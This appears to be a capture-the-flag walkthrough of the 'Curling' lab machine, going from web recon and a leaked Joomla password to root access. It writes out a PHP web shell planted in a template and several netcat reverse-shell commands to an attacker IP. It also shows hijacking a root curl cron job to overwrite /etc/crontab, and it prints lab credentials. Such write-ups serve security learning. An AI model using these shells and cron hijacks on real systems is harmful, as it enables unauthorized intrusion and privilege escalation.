1, Recon
port scan 
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

page check
![](images/Pasted%20image%2020241127221709.png)
By check `whatweb`, we found the version of `CMS` is `Joomla!`
```
whatweb http://10.10.10.150  

http://10.10.10.150 [200 OK] Apache[2.4.29], Bootstrap, Cookies[c0548020854924e0aecd05ed9f5b672b], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], HttpOnly[c0548020854924e0aecd05ed9f5b672b], IP[10.10.10.150], JQuery, MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], Script[application/json], Title[Home]

```

And enumerating the web-content, we found 
```
ffuf -u http://10.10.10.150/FUZZ -w /usr/share/wordlists/dirb/common.txt

administrator
bin
cache
components
images
includes
language
layouts
libraries
media
modules
plugins
templates
tmp
```

When we direct to `/administrator`, we would be redirect to the dashboard of `joomla`
![](images/Pasted%20image%2020241127222658.png)

But we still don't have valid credentials, I have tried default credentials `admin:admin`, but it didn't work.

When I check the title of index page of `http://10.10.10.150/`, I found some hints
`[Cewl Curling site!](http://10.10.10.150/)`
So let's `cewl` it and try to get the valid credentials.

All right, very sad, Still not work.

We have to continue enumerate all the existed web-contents, such as the source code of pages.
From the source code of index page, i found that in the end of the code.
```
</body>
      <!-- secret.txt -->
</html>
```

So just check it `http://10.10.10.150/secret.txt`
we get `Q3VybGluZzIwMTgh`, seems like a encoded password.
Just try to use decode of base64, we get `Curling2018!`
But we do not get the username, so let's find that by using this key words
we find that from the source code
```
<p>Hey this is the first post on this amazing website! Stay tuned for more amazing content! curling2018 for the win!</p>
<p>- Floris</p>
```

So, the credential would be `Floris:Curling2018!`
Then we finally get into the dashboard of `Joomla`
![](images/Pasted%20image%2020241127225414.png)

Of course, we get the version `Joomla! 3.8.8` and the system information
![](images/Pasted%20image%2020241127225652.png)

And also we want to check the configuration file, but very sadly, the password and username has been hidden because of safe settings.

But we can edit the `index.php` from `Templates/Protostar`
![](images/Pasted%20image%2020241127231212.png)
Then choose `Templates/protostar`, and add the web shell into the index page
`system($_REQUEST['pwn']);` and save it.

Then we can try it `http://10.10.10.150/index.php?pwn=id`
![](images/Pasted%20image%2020241127231343.png)

Then we can run a reverse shell command to get shell.
```
curl http://10.10.10.150/index.php -G --data-urlencode 'pwn=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 443 >/tmp/f'
```
Then we can get the credential 
```
public $dbtype = 'mysqli';
public $host = 'localhost';
public $user = 'floris';
public $password = 'mYsQ!P4ssw0rd$yea!';
```
Then we can login into mysql and get the password hash
`floris   | webmaster@localhost | $2y$10$4t3DQSg0DSlKcDEkf1qEcu6nUFEr/gytHfVENwSmZN1MXxE1Ssx.e`

But very sad, I could not crack it by using rockyou.txt.

So let's continue to enumerate deeper, I found a file `password_backup` in the directory `/home/floris`
```
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H

```
It seems like a  hex dump. We can use `xxd` which can be reversed.
```
xxd -r password_backup password

Then check the file:
file password
password: bzip2 compressed data, block size = 900k
```
It seems like a Repeated compression process
```
bzip2 -d password
file password.out
password.out: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix

mv password.out password.gz
gzip -d password.gz
file password
password: bzip2 compressed data, block size = 900k

bzip2 -d password
file password.out
password.out: POSIX tar archive (GNU)

tar xf password.out
Fianlly we get the password.txt
5d<wdCbdZu)|hChXll
```

Then we can use that to login the ssh of user `floris`

3, shell as root
Firstly, I would like check `sudo -l`
```
sudo -l
[sudo] password for floris: 
Sorry, user floris may not run sudo on curling.
```
Then continue check `net state`
```
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      - 
```
Nothing interesting, so continue to check the home directory.
There is a `admin-area` directory here but seems nothing useful.
```
drwxr-xr-x 6 floris floris 4096 Aug  2  2022 .
drwxr-xr-x 3 root   root   4096 Aug  2  2022 ..
drwxr-x--- 2 root   floris 4096 Aug  2  2022 admin-area
lrwxrwxrwx 1 root   root      9 May 22  2018 .bash_history -> /dev/null
-rw-r--r-- 1 floris floris  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 floris floris 3771 Apr  4  2018 .bashrc
drwx------ 2 floris floris 4096 Aug  2  2022 .cache
drwx------ 3 floris floris 4096 Aug  2  2022 .gnupg
drwxrwxr-x 3 floris floris 4096 Aug  2  2022 .local
-rw-r--r-- 1 floris floris 1076 May 22  2018 password_backup
-rw-r--r-- 1 floris floris  807 Apr  4  2018 .profile
-rw-r----- 1 floris floris   33 Nov 28 03:15 user.txt
```

By using `pspy64` we find something worked in the background by root
```
2024/11/28 04:53:01 CMD: UID=0    PID=27058  | curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
2024/11/28 04:53:01 CMD: UID=0    PID=27057  | sleep 1 
2024/11/28 04:53:01 CMD: UID=0    PID=27056  | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
2024/11/28 04:53:02 CMD: UID=???  PID=27059  | ???
```
In this place, we can exploit it by changing the `crontab` by write into `/etc/crontab`
```
curl: A command-line tool used to transfer data from or to a server using supported protocols (HTTP, FTP, etc.).

-K /home/floris/admin-area/input:

-K tells curl to read its configuration options from the file specified (/home/floris/admin-area/input).
The file should contain valid curl options in a format like:
makefile
复制代码
url = "http://example.com"
user = "username:password"
This allows you to specify multiple options in a cleaner way than writing them all on the command line.
-o /home/floris/admin-area/report:

-o specifies the output file where the content fetched by curl will be saved.
In this case, the fetched data will be written to /home/floris/admin-area/report.
```

In this place, we need to put the malicious script into the target crontab
```
cp /etc/crontab .
echo '* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i
2>&1|nc 10.10.16.4 443 >/tmp/f ' >> crontab
python3 -m http.server 80
```

Then change the `input` file
```
url = "http://10.10.16.14/crontab"
output = "/etc/crontab"
```

Remember to open the netcat and listening the port 443, and wait a minute to get the shell back.



